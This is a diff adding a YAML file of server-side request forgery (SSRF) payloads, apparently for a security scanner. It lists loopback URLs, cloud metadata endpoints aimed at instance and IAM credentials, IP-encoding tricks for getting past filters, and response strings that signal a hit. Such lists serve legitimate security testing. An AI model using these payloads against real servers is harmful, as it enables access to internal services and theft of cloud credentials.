@@ -1,0 +1,35 @@
+# SSRF payloads
+internal_urls:
+  - "http://127.0.0.1"
+  - "http://localhost"
+  - "http://0.0.0.0"
+  - "http://[::1]"
+  - "http://127.0.0.1:80"
+  - "http://127.0.0.1:443"
+  - "http://127.0.0.1:8080"
+  - "http://127.0.0.1:3000"
+  - "http://127.0.0.1:22"
+
+cloud_metadata:
+  - "http://169.254.169.254/latest/meta-data/"
+  - "http://169.254.169.254/latest/api/token"
+  - "http://metadata.google.internal/computeMetadata/v1/"
+  - "http://100.100.100.200/latest/meta-data/"
+  - "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+
+bypass:
+  - "http://2130706433"
+  - "http://0x7f000001"
+  - "http://017700000001"
+  - "http://127.1"
+  - "http://127.0.0.1.nip.io"
+
+# patterns in responses that indicate SSRF success
+success_signatures:
+  - "ami-"
+  - "instance-id"
+  - "local-ipv4"
+  - "meta-data"
+  - "computeMetadata"
+  - "iam/security-credentials"
+  - "hostname"
